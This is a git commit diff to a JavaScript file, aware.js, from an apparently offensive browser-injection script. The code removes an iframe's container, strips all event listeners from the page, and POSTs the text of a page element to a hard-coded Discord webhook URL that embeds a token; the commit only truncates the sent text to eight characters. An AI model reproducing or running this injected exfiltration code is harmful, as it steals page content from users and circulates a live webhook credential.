b1ee77c131244c8b492da6e75f81432d0715b40f
Reality <63677818+Th3R3ality@users.noreply.github.com>
2024-04-21 18:06:13 +0200

    Update aware.js

--- aware.js
+++ aware.js
@@ -2,7 +2,6 @@ var frames = document.getElementsByTagName("iframe");
 frames[0].parentNode.parentNode.parentNode.remove();
 setTimeout(alert,100, "O_o");
 
-
 window.removeAllEventListeners = () => {
     Array.from(document.querySelectorAll('*')).forEach(element => {
         const listeners = getEventListeners(element);
@@ -15,9 +14,8 @@ window.removeAllEventListeners = () => {
 };
 removeAllEventListeners();
 
-
 var xhr = new XMLHttpRequest();
 xhr.open("POST","https://discord.com/api/webhooks/881918023764697128/tEtQqj3w08JSjay5Jg4CIzijyTb2akzTosya6NVKL8Pr-gMMq33TwPwyy-wInoErm_YA", true);
 xhr.setRequestHeader("Content-Type", "application/json");
-var content = document.querySelector("#C\\\\.10").innerText + " o_O";
+var content = document.querySelector("#C\\\\.10").innerText.slice(0,8) + " o_O";
 xhr.send(JSON.stringify({"content": content}));
